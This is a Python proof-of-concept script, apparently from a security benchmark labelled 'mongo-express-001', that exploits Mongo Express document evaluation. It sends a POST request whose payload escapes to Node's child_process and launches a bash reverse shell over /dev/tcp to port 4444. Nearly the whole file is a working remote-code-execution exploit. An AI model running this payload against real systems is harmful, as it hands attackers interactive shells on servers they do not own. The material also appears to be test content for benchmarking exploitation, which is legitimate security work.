#!/usr/bin/env python3
"""Execute a reverse shell through Mongo Express document evaluation."""

import json
import os
import time
import urllib.error
import urllib.parse
import urllib.request


def trigger(target_url: str) -> int:
    command = "bash -c 'bash -i >& /dev/tcp/localhost/4444 0>&1'"
    expression = (
        '(this.constructor.constructor("return process")()'
        '.mainModule.require("child_process").exec('
        + json.dumps(command)
        + '), {benchmark: "mongo-express-001"})'
    )
    payload = urllib.parse.urlencode({"document": expression}).encode()
    request = urllib.request.Request(
        target_url.rstrip("/") + "/db/test/items",
        data=payload,
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=20) as response:
            response.read()
            return response.status
    except urllib.error.HTTPError as error:
        error.read()
        return error.code


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    status = trigger(target_url)
    if status not in (200, 302):
        raise RuntimeError(f"Unexpected application response: {status}")
    time.sleep(3)
    print(json.dumps({"evidence_payload": {}, "request_status": status}))


if __name__ == "__main__":
    main()
